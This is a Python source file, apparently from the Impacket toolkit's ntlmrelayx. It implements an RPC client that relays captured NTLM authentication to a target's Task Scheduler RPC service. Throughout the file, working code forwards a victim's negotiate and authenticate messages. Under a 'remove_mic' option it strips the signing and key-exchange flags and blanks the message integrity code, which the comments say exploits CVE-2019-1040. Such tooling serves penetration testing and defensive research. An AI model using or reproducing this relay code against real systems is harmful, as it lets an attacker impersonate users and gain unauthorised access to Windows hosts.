# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# RPC Protocol Client
#
# Author:
#  Sylvain Heiniger / Compass Security (@sploutchy / https://www.compass-security.com)
#
# Description:
# RPC client for relaying NTLMSSP authentication to RPC servers
#

from impacket.dcerpc.v5.transport import *
from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5 import tsch, epm
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.nt_errors import STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN,\
    NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
from impacket.spnego import SPNEGO_NegTokenResp

PROTOCOL_CLIENT_CLASSES = ["RPCRelayClient"]


class RPCRelayClientException(Exception):
    pass


class RPCRelayClient(ProtocolClient):
    PLUGIN_NAME = "RPC"

    def __init__(self, serverConfig, target, targetPort=135, extendedSecurity=True):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.dcerpc_transport = None
        self.__callid = 1

    def killConnection(self):
        if self.session is not None:
            self.session.socket.close()
            self.session = None

    def initConnection(self):
        # FIRST DO A EPM PORTMAP
        binding = epm.hept_map(self.targetHost, tsch.MSRPC_UUID_TSCHS, protocol='ncacn_ip_tcp')
        if binding is not None:
            dcerpc_transport_factory = DCERPCTransportFactory(binding)
            self.dcerpc_transport = dcerpc_transport_factory.get_dce_rpc()
            self.dcerpc_transport.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
            self.dcerpc_transport.set_auth_type(RPC_C_AUTHN_WINNT)
            self.dcerpc_transport.connect()

            return True
        return False

    def sendNegotiate(self, negotiateMessage):
        try:
            negoMessage = NTLMAuthNegotiate()
            negoMessage.fromString(negotiateMessage)
            # When exploiting CVE-2019-1040, remove flags
            if self.serverConfig.remove_mic:
                if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                    negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
                if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                    negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

            self.negotiateMessage = negoMessage.getData()

            response = self.do_send_negotiate(self.negotiateMessage)
            challenge = NTLMAuthChallenge()
            challenge.fromString(response['auth_data'])
            return challenge
        except Exception as e:
            LOG.debug("Exception:", exc_info=True)
            raise

    def do_send_negotiate(self, negotiate):
        bind = MSRPCBind()

        item = CtxItem()
        item['AbstractSyntax'] = tsch.MSRPC_UUID_TSCHS
        item['TransferSyntax'] = uuidtup_to_bin(MSRPC_STANDARD_NDR_SYNTAX)
        item['ContextID'] = self.dcerpc_transport._ctx
        item['TransItems'] = 1
        bind.addCtxItem(item)

        packet = MSRPCHeader()
        packet['type'] = MSRPC_BIND
        packet['pduData'] = bind.getData()
        packet['call_id'] = self.__callid

        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type'] = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level'] = RPC_C_AUTHN_LEVEL_CONNECT
        sec_trailer['auth_ctx_id'] = self.dcerpc_transport._ctx + 79231

        pad = (4 - (len(packet.get_packet()) % 4)) % 4
        if pad != 0:
            packet['pduData'] += b'\xFF' * pad
            sec_trailer['auth_pad_len'] = pad

        packet['sec_trailer'] = sec_trailer
        packet['auth_data'] = negotiate

        self.dcerpc_transport._transport.send(packet.get_packet())

        s = self.dcerpc_transport._transport.recv()

        if s != 0:
            resp = MSRPCHeader(s)
        else:
            return 0  # mmm why not None?

        if resp['type'] == MSRPC_BINDACK:
            self.dcerpc_transport.set_call_id(resp['call_id'])
            bindResp = MSRPCBindAck(resp['pduData'])
            self.dcerpc_transport.set_max_tfrag(bindResp['max_tfrag'])
            return resp
        else:
            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', authenticateMessageBlob[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2['ResponseToken']
        else:
            token = authenticateMessageBlob

        authMessage = NTLMAuthChallengeResponse()
        authMessage.fromString(token)
        # When exploiting CVE-2019-1040, remove flags
        if self.serverConfig.remove_mic:
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
            authMessage['MIC'] = b''
            authMessage['MICLen'] = 0
            authMessage['Version'] = b''
            authMessage['VersionLen'] = 0
            token = authMessage.getData()

        self.authenticateMessageBlob = token
        self.do_send_auth(authMessage)
        self.session = self.dcerpc_transport
        return None, STATUS_SUCCESS

    def do_send_auth(self, auth):
        auth3 = MSRPCHeader()
        auth3['type'] = MSRPC_AUTH3
        # pad (4 bytes): Can be set to any arbitrary value when set and MUST be
        # ignored on receipt. The pad field MUST be immediately followed by a
        # sec_trailer structure whose layout, location, and alignment are as
        # specified in section 2.2.2.11
        auth3['pduData'] = b'    '
        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type'] = RPC_C_AUTHN_WINNT
        sec_trailer['auth_level'] = RPC_C_AUTHN_LEVEL_CONNECT
        sec_trailer['auth_ctx_id'] = self.dcerpc_transport._ctx + 79231
        auth3['sec_trailer'] = sec_trailer
        auth3['auth_data'] = auth

        # Use the same call_id
        auth3['call_id'] = self.__callid
        self.dcerpc_transport._transport.send(auth3.get_packet(), forceWriteAndx=1)
